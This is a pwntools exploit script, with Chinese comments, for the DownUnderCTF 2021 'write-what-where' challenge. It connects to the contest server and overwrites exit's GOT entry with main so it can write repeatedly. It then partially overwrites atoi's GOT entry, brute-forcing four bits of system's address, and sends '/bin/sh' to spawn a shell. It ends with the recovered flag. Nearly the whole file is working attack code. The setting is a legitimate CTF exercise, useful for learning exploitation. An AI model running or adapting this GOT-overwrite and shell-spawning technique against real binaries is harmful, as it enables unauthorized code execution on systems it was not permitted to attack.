from pwn import *
context.log_level = 'debug'

libc = ELF('./libc.so.6')
e = ELF('./write-what-where')
print(hex(libc.sym['system']), hex(libc.sym['atoi']))
# if args.LOCAL:
#     p = process('./write-what-where')
#     print(p.pid)
#     pause()
# else:
#     p = remote('pwn-2021.duc.tf', 31920)

# p.sendafter('what?\n', p64(e.sym['main'])[:4])
# # p.sendafter('what?\n', p64(e.plt['read']))
# p.sendafter('where?\n', str(e.got['exit']).encode())

# payload = b'/bin/sh\x00'
# p.interactive()

# 不知道怎么泄露libc基址，爬了

# 后续：赛后看了一下wp，其实就是暴力

while True:
    p = remote('pwn-2021.duc.tf', 31920)

    # exit -> main
    # 使我们能够多次写
    p.sendafter(b'what?\n', p64(e.sym['main'])[:4])
    p.sendafter(b'where?\n', str(e.got['exit']).encode())

    # libc.sym['system']: 0x4fa60
    # libc.sym['atoi]:    0x421f0
    # 从 e.got['atoi']-2的地方写4字节，我们就只需要爆破4bit
    # 正好x64的8字节地址实际上高2字节都是不会用到的，即为b'\x00\x00'

    p.sendafter(b'what?\n', p32(0xda600000)) # 随便选个xa60
    p.sendafter(b'where?\n', str(e.got['atoi']-2).encode())

    p.sendafter(b'what?\n', p32(0xda600000)) # 随便选个xa60
    p.sendafter(b'where?\n', b'/bin/sh\x00')

    try:
        p.sendline(b'ls')
        p.recvuntil(b'flag') # 假如ls返回正确结果
        p.interactive()
        break
    except EOFError:
        p.close()

# DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}